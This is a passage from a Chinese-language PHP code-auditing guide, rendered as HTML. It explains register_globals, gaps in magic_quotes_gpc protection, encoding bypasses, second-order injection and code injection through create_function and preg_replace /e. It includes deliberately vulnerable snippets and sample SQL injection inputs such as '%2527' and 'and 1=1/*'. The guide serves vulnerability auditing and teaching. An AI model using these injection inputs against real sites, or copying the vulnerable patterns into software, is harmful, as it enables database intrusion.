class=\"line\"><span class=\"keyword\">if</span> ($_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>] != <span class=\"string\">'10.1.1.1'</span>) <span class=\"keyword\">die</span>(<span class=\"string\">'Go away!'</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">'Hello admin!'</span>;</span><br></pre></td></tr></table></figure>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>漏洞审计策略（import_request_variables）</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">PHP版本要求：php4&lt;4.4.1 php5&lt;5.2.2<br>系统要求：无<br>审计策略：查找字符import_request_variables </td></tr></tbody></table>\n\n\n\n<h4 id=\"php5-globals\"><a class=\"header-anchor\" href=\"#php5-globals\">null</a>PHP5 Globals</h4>\n<p>从严格意义上来说这个不可以算是PHP的漏洞，只能算是一个特性，测试代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?</span></span><br><span class=\"line\"><span class=\"comment\">// register_globals =ON</span></span><br><span class=\"line\"><span class=\"comment\">//foo.php?GLOBALS[foobar]=HELLO</span></span><br><span class=\"line\">php <span class=\"keyword\">echo</span> $foobar; </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>但是很多的程序没有考虑到这点，请看如下代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//为了安全取消全局变量</span></span><br><span class=\"line\"><span class=\"comment\">//var.php?GLOBALS[a]=aaaa&amp;b=111</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (ini_get(<span class=\"string\">'register_globals'</span>)) <span class=\"keyword\">foreach</span>($_REQUEST <span class=\"keyword\">as</span> $k=&gt;$v) <span class=\"keyword\">unset</span>($&#123;$k&#125;);</span><br><span class=\"line\"><span class=\"keyword\">print</span> $a;</span><br><span class=\"line\"><span class=\"keyword\">print</span> $_GET[b];</span><br></pre></td></tr></table></figure>\n<p>如果熟悉WEB2.0的攻击的同学，很容易想到上面的代码我们可以利用这个特性进行crsf攻击。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>漏洞审计策略</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 </td></tr></tbody></table>\n\n\n\n<h3 id=\"magic-quotes-gpc与代码安全\"><a class=\"header-anchor\" href=\"#magic-quotes-gpc与代码安全\">null</a>magic_quotes_gpc与代码安全</h3>\n<h4 id=\"什么是magic-quotes-gpc\"><a class=\"header-anchor\" href=\"#什么是magic-quotes-gpc\">null</a>什么是magic_quotes_gpc</h4>\n<p>当打开时，所有的 '（单引号），&quot;（双引号），\\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。还有很多函数有类似的作用 如：addslashes()、mysql_escape_string()、mysql_real_escape_string()等，另外还有parse_str()后的变量也受magic_quotes_gpc的影响。目前大多数的主机都打开了这个选项，并且很多程序员也注意使用上面那些函数去过滤变量，这看上去很安全。很多漏洞查找者或者工具遇到些函数过滤后的变量直接就放弃，但是就在他们放弃的同时也放过很多致命的安全漏洞。 ：）</p>\n<h4 id=\"哪些地方没有魔术引号的保护\"><a class=\"header-anchor\" href=\"#哪些地方没有魔术引号的保护\">null</a>哪些地方没有魔术引号的保护</h4>\n<p><strong>1) $<code>_</code>SERVER变量</strong></p>\n<p>PHP5的$<code>_</code>SERVER变量缺少magic_quotes_gpc的保护，导致近年来X-Forwarded-For的漏洞猛暴，所以很多程序员考虑过滤X-Forwarded-For，但是其他的变量呢？</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>漏洞审计策略（$<code>_</code>SERVER变量）</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">PHP版本要求：无<br>系统要求：无<br>审计策略：查找字符<code>_</code>SERVER </td></tr></tbody></table>\n\n\n\n<p><strong>2) getenv()得到的变量（使用类似$<code>_</code>SERVER变量）</strong></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>漏洞审计策略（getenv()）</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">PHP版本要求：无<br>系统要求：无<br>审计策略：查找字符getenv </td></tr></tbody></table>\n\n\n\n<p><strong>3) $HTTP_RAW_POST_DATA与PHP输入、输出流</strong></p>\n<p>主要应用与soap/xmlrpc/webpublish功能里，请看如下代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( !<span class=\"keyword\">isset</span>( $HTTP_RAW_POST_DATA ) ) &#123;</span><br><span class=\"line\">\t$HTTP_RAW_POST_DATA = file_get_contents( <span class=\"string\">'php://input'</span> );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( <span class=\"keyword\">isset</span>($HTTP_RAW_POST_DATA) )</span><br><span class=\"line\">\t$HTTP_RAW_POST_DATA = trim($HTTP_RAW_POST_DATA);</span><br></pre></td></tr></table></figure>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>漏洞审计策略（数据流）</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">PHP版本要求：无<br>系统要求：无<br>审计策略：查找字符HTTP_RAW_POST_DATA或者php://input </td></tr></tbody></table>\n\n\n\n<p><strong>4) 数据库操作容易忘记’的地方如：in()/limit/order by/group by</strong></p>\n<p>如Discuz!&lt;5.0的pm.php：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(is_array($msgtobuddys)) &#123;</span><br><span class=\"line\">\t$msgto = array_merge($msgtobuddys, <span class=\"keyword\">array</span>($msgtoid));</span><br><span class=\"line\">\t\t......</span><br><span class=\"line\"><span class=\"keyword\">foreach</span>($msgto <span class=\"keyword\">as</span> $uid) &#123;</span><br><span class=\"line\">\t$uids .= $comma.$uid;</span><br><span class=\"line\">\t$comma = <span class=\"string\">','</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">......</span><br><span class=\"line\">$query = $db-&gt;query(<span class=\"string\">\"SELECT m.username, mf.ignorepm FROM &#123;$tablepre&#125;members m</span></span><br><span class=\"line\"><span class=\"string\">\tLEFT JOIN &#123;$tablepre&#125;memberfields mf USING(uid)</span></span><br><span class=\"line\"><span class=\"string\">\tWHERE m.uid IN ($uids)\"</span>);</span><br></pre></td></tr></table></figure>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>漏洞审计策略</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">PHP版本要求：无<br>系统要求：无<br>审计策略：查找数据库操作字符（select,update,insert等等） </td></tr></tbody></table>\n\n\n\n<h4 id=\"变量的编码与解码\"><a class=\"header-anchor\" href=\"#变量的编码与解码\">null</a>变量的编码与解码</h4>\n<p>一个WEB程序很多功能的实现都需要变量的编码解码，而且就在这一转一解的传递过程中就悄悄的绕过你的过滤的安全防线。</p>\n<p>这个类型的主要函数有：</p>\n<p><strong>1) stripslashes() 这个其实就是一个decode-addslashes()</strong></p>\n<p><strong>2) 其他字符串转换函数：</strong></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">base64_decode</th>\n<th style=\"text-align:left\">对使用 MIME base64 编码的数据进行解码</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">base64_encode</td>\n<td style=\"text-align:left\">使用 MIME base64 对数据进行编码</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">rawurldecode</td>\n<td style=\"text-align:left\">对已编码的 URL 字符串进行解码</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">rawurlencode</td>\n<td style=\"text-align:left\">按照 RFC 1738 对 URL 进行编码</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">urldecode</td>\n<td style=\"text-align:left\">解码已编码的 URL 字符串</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">urlencode</td>\n<td style=\"text-align:left\">编码 URL 字符串</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">…</td>\n<td style=\"text-align:left\">…</td>\n</tr>\n</tbody>\n</table>\n<p><em>另外一个 unserialize/serialize</em></p>\n<p><strong>3) 字符集函数（GKB,UTF7/8…）如iconv()/mb_convert_encoding()等</strong></p>\n<p>目前很多漏洞挖掘者开始注意这一类型的漏洞了，如典型的urldecode：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql = &quot;SELECT * FROM article WHERE articleid=&apos;&quot;.urldecode($_GET[id]).&quot;&apos;&quot;;</span><br></pre></td></tr></table></figure>\n<p>当magic_quotes_gpc=on时，我们提交?id=%2527，得到sql语句为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT * FROM article WHERE articleid=&apos;&apos;&apos;</span><br></pre></td></tr></table></figure>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>漏洞审计策略</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">PHP版本要求：无<br>系统要求：无<br>审计策略：查找对应的编码函数 </td></tr></tbody></table>\n\n\n\n<h4 id=\"二次攻击\"><a class=\"header-anchor\" href=\"#二次攻击\">null</a>二次攻击</h4>\n<p><em>详细见附录<code>[</code>1<code>]</code></em></p>\n<p><strong>1)数据库出来的变量没有进行过滤</strong></p>\n<p><strong>2)数据库的转义符号：</strong></p>\n<ul>\n<li>mysql/oracle转义符号同样是\\（我们提交’通过魔术引号变化为’，当我们update进入数据库时，通过转义变为’）</li>\n<li>mssql的转义字符为’（所以我们提交’通过魔术引号变化为’，mssql会把它当为一个字符串直接处理，所以魔术引号对于mssql的注射没有任何意义）</li>\n</ul>\n<p>从这里我们可以思考得到一个结论：一切进入函数的变量都是有害的，另外利用二次攻击我们可以实现一个webrootkit，把我们的恶意构造直接放到数据库里。我们应当把这样的代码看成一个vul？</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>漏洞审计策略</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 </td></tr></tbody></table>\n\n\n\n<h4 id=\"魔术引号带来的新的安全问题\"><a class=\"header-anchor\" href=\"#魔术引号带来的新的安全问题\">null</a>魔术引号带来的新的安全问题</h4>\n<p>首先我们看下魔术引号的处理机制：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[\\--&gt;\\\\,&apos;--&gt;\\&apos;,&quot;--&gt;\\&quot;,null--&gt;\\0]</span><br></pre></td></tr></table></figure>\n<p>这给我们引进了一个非常有用的符号“\\”，“\\”符号不仅仅是转义符号，在WIN系统下也是目录转跳的符号。这个特点可能导致php应用程序里产生非常有意思的漏洞：</p>\n<p><strong>1)得到原字符（’,,&quot;,null]）</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$order_sn=substr($_GET[<span class=\"string\">'order_sn'</span>], <span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//提交                 '</span></span><br><span class=\"line\"><span class=\"comment\">//魔术引号处理         \\'</span></span><br><span class=\"line\"><span class=\"comment\">//substr               '</span></span><br><span class=\"line\"></span><br><span class=\"line\">$sql = <span class=\"string\">\"SELECT order_id, order_status, shipping_status, pay_status, \"</span>.</span><br><span class=\"line\">   <span class=\"string\">\" shipping_time, shipping_id, invoice_no, user_id \"</span>.</span><br><span class=\"line\">   <span class=\"string\">\" FROM \"</span> . $ecs-&gt;table(<span class=\"string\">'order_info'</span>).</span><br><span class=\"line\">   <span class=\"string\">\" WHERE order_sn = '$order_sn' LIMIT 1\"</span>;</span><br></pre></td></tr></table></figure>\n<p><strong>2)得到“\\”字符</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$order_sn=substr($_GET[<span class=\"string\">'order_sn'</span>], <span class=\"number\">0</span>,<span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//提交                 '</span></span><br><span class=\"line\"><span class=\"comment\">//魔术引号处理         \\'</span></span><br><span class=\"line\"><span class=\"comment\">//substr               \\    </span></span><br><span class=\"line\"></span><br><span class=\"line\">$sql = <span class=\"string\">\"SELECT order_id, order_status, shipping_status, pay_status, \"</span>.</span><br><span class=\"line\">   <span class=\"string\">\" shipping_time, shipping_id, invoice_no, user_id \"</span>.</span><br><span class=\"line\">   <span class=\"string\">\" FROM \"</span> . $ecs-&gt;table(<span class=\"string\">'order_info'</span>).</span><br><span class=\"line\">   <span class=\"string\">\" WHERE order_sn = '$order_sn' and order_tn='\"</span>.$_GET[<span class=\"string\">'order_tn'</span>].<span class=\"string\">\"'\"</span>;</span><br></pre></td></tr></table></figure>\n<p>提交内容：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?order_sn=&apos;&amp;order_tn=%20and%201=1/*</span><br></pre></td></tr></table></figure>\n<p>执行的SQL语句为：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT order_id, order_status, shipping_status, pay_status, shipping_time, </span><br><span class=\"line\">shipping_id, invoice_no, user_id FROM order_info WHERE order_sn = <span class=\"string\">'\\' and </span></span><br><span class=\"line\"><span class=\"string\">order_tn='</span> <span class=\"keyword\">and</span> <span class=\"number\">1</span>=<span class=\"number\">1</span><span class=\"comment\">/*'</span></span><br></pre></td></tr></table></figure>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>漏洞审计策略</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">PHP版本要求：无<br>系统要求：无<br>审计策略：查找字符串处理函数如substr或者通读代码 </td></tr></tbody></table>\n\n\n\n<h4 id=\"变量key与魔术引号\"><a class=\"header-anchor\" href=\"#变量key与魔术引号\">null</a>变量key与魔术引号</h4>\n<p>我们最在这一节的开头就提到了变量key，PHP的魔术引号对它有什么影响呢？</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//key.php?aaaa'aaa=1&amp;bb'b=2 </span></span><br><span class=\"line\"><span class=\"comment\">//print_R($_GET); </span></span><br><span class=\"line\"> <span class=\"keyword\">foreach</span> ($_GET <span class=\"keyword\">AS</span> $key =&gt; $value)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">        <span class=\"keyword\">print</span> $key.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>1)当magic_quotes_gpc = On时，在php5.24下测试显示：</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aaaa\\&apos;aaa</span><br><span class=\"line\">bb\\&apos;b</span><br></pre></td></tr></table></figure>\n<p>从上面结果可以看出来，在设置了magic_quotes_gpc = On下，变量key受魔术引号影响。但是在php4和php&lt;5.2.1的版本中，不处理数组第一维变量的key，测试代码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//key.php?aaaa'aaa[bb']=1 </span></span><br><span class=\"line\">print_R($_GET); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>结果显示:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Array ( [aaaa&apos;aaa] =&gt; Array ( [bb\\&apos;] =&gt; 1 ) )</span><br></pre></td></tr></table></figure>\n<p>数组第一维变量的key不受魔术引号的影响。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>漏洞审计策略</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">PHP版本要求：php4和php&lt;5.2.1<br>系统要求：无<br>审计策略：通读代码 </td></tr></tbody></table>\n\n\n\n<p><strong>2)当magic_quotes_gpc = Off时，在php5.24下测试显示：</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aaaa&apos;aaa</span><br><span class=\"line\">bb&apos;b</span><br></pre></td></tr></table></figure>\n<p>对于magic_quotes_gpc = Off时所有的变量都是不安全的，考虑到这个，很多程序都通过addslashes等函数来实现魔术引号对变量的过滤，示例代码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"comment\">//keyvul.php?aaa'aa=1'</span></span><br><span class=\"line\"><span class=\"comment\">//magic_quotes_gpc = Off</span></span><br><span class=\"line\"> <span class=\"keyword\">if</span> (!get_magic_quotes_gpc())</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"> $_GET  = addslashes_array($_GET);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">addslashes_array</span><span class=\"params\">($value)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> is_array($value) ? array_map(<span class=\"string\">'addslashes_array'</span>, $value) : addslashes($value);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">print_R($_GET);</span><br><span class=\"line\"><span class=\"keyword\">foreach</span> ($_GET <span class=\"keyword\">AS</span> $key =&gt; $value)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">print</span> $key;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>以上的代码看上去很完美，但是他这个代码里addslashes($value)只处理了变量的具体的值，但是没有处理变量本身的key，上面的代码显示结果如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Array</span><br><span class=\"line\">(</span><br><span class=\"line\">    [aaa&apos;aa] =&gt; 1\\&apos;</span><br><span class=\"line\">)</span><br><span class=\"line\">aaa&apos;aa</span><br></pre></td></tr></table></figure>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>漏洞审计策略</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 </td></tr></tbody></table>\n\n\n\n<h3 id=\"代码注射\"><a class=\"header-anchor\" href=\"#代码注射\">null</a>代码注射</h3>\n<h4 id=\"php中可能导致代码注射的函数\"><a class=\"header-anchor\" href=\"#php中可能导致代码注射的函数\">null</a>PHP中可能导致代码注射的函数</h4>\n<p>很多人都知道eval、preg_replace+/e可以执行代码，但是不知道php还有很多的函数可以执行代码如：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">assert()</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">call_user_func()</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">call_user_func_array()</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">create_function()</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">变量函数</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">…</td>\n</tr>\n</tbody>\n</table>\n<p>这里我们看看最近出现的几个关于create_function()代码执行漏洞的代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//how to exp this code</span></span><br><span class=\"line\">$sort_by=$_GET[<span class=\"string\">'sort_by'</span>];</span><br><span class=\"line\">$sorter=<span class=\"string\">'strnatcasecmp'</span>;</span><br><span class=\"line\">$databases=<span class=\"keyword\">array</span>(<span class=\"string\">'test'</span>,<span class=\"string\">'test'</span>);</span><br><span class=\"line\">$sort_function = <span class=\"string\">'  return 1 * '</span> . $sorter . <span class=\"string\">'($a[\"'</span> . $sort_by . <span class=\"string\">'\"], $b[\"'</span> . $sort_by . <span class=\"string\">'\"]);</span></span><br><span class=\"line\"><span class=\"string\">\t      '</span>;</span><br><span class=\"line\">usort($databases, create_function(<span class=\"string\">'$a, $b'</span>, $sort_function));</span><br></pre></td></tr></table></figure>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>漏洞审计策略</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">PHP版本要求：无<br>系统要求：无<br>审计策略：查找对应函数（assert,call_user_func,call_user_func_array,create_function等） </td></tr></tbody></table>\n\n\n\n<h4 id=\"变量函数与双引号\"><a class=\"header-anchor\" href=\"#变量函数与双引号\">null</a>变量函数与双引号</h4>\n<p>对于单引号和双引号的区别，很多程序员深有体会，示例代码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;$a\\n&quot;;</span><br><span class=\"line\">echo &apos;$a\\n&apos;;</span><br></pre></td></tr></table></figure>\n<p>我们再看如下代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//how to exp this code</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>($globals[<span class=\"string\">'bbc_email'</span>])&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">$text = preg_replace(</span><br><span class=\"line\">\t\t<span class=\"keyword\">array</span>(<span class=\"string\">\"/\\[email=(.*?)\\](.*?)\\[\\/email\\]/ies\"</span>,</span><br><span class=\"line\">\t\t\t\t<span class=\"string\">\"/\\[email\\](.*?)\\[\\/email\\]/ies\"</span>),</span><br><span class=\"line\">\t\t<span class=\"keyword\">array</span>(<span class=\"string\">'check_email(\"$1\", \"$2\")'</span>,</span><br><span class=\"line\">\t\t\t\t<span class=\"string\">'check_email(\"$1\", \"$1\")'</span>), $text);</span><br></pre></td></tr></table></figure>\n<p>另外很多的应用程序都把变量用&quot;&quot;存放在缓存文件或者config或者data文件里，这样很容易被人注射变量函数。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>漏洞审计策略</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 </td></tr></tbody></table>\n\n\n\n<h3 id=\"php自身函数漏洞及缺陷\"><a class=\"header-anchor\" href=\"#php自身函数漏洞及缺陷\">null</a>PHP自身函数漏洞及缺陷</h3>\n<h4 id=\"php函数的溢出漏洞\"><a class=\"header-anchor\" href=\"#php函数的溢出漏洞\">null</a>PHP函数的溢出漏洞</h4>\n<p>大家还记得Stefan Esser大牛的Month of PHP Bugs（MOPB见附录<a href=\"2.md\">2</a>）项目么，其中比较有名的要算是unserialize()，代码如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">unserialize(stripslashes($HTTP_COOKIE_VARS[$cookiename . &apos;_data&apos;]);</span><br></pre></td></tr></table></figure>\n<p>在以往的PHP版本里，很多函数都曾经出现过溢出漏洞，所以我们在审计应用程序漏洞的时候不要忘记了测试目标使用的PHP版本信息。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>漏洞审计策略</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">PHP版本要求：对应fix的版本<br>系统要求：<br>审计策略：查找对应函数名 </td></tr></tbody></table>\n\n\n\n<h4 id=\"php函数的其他漏洞\"><a class=\"header-anchor\" href=\"#php函数的其他漏洞\">null</a>PHP函数的其他漏洞</h4>\n<p>Stefan Esser大牛发现的漏洞：unset()–Zend_Hash_Del_Key_Or_Index Vulnerability</p>\n<p>比如phpwind早期的serarch.php里的代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">unset</span>($uids);</span><br><span class=\"line\">......</span><br><span class=\"line\">$query=$db-&gt;query(<span class=\"string\">\"SELECT uid FROM pw_members WHERE username LIKE '$pwuser'\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">while</span>($member=$db-&gt;fetch_array($query))&#123;</span><br><span class=\"line\">\t$uids .= $member[<span class=\"string\">'uid'</span>].<span class=\"string\">','</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$uids ? $uids=substr($uids,<span class=\"number\">0</span>,<span class=\"number\">-1</span>) : $sqlwhere.=<span class=\"string\">' AND 0 '</span>;</span><br><span class=\"line\">........</span><br><span class=\"line\">$query = $db-&gt;query(<span class=\"string\">\"SELECT DISTINCT t.tid FROM $sqltable WHERE $sqlwhere $orderby $limit\"</span>);</span><br></pre></td></tr></table></figure>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>漏洞审计策略</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">PHP版本要求：php4&lt;4.3 php5&lt;5.14<br>系统要求：无<br>审计策略：查找unset </td></tr></tbody></table>\n\n\n\n<h4 id=\"session-destroy-删除文件漏洞\"><a class=\"header-anchor\" 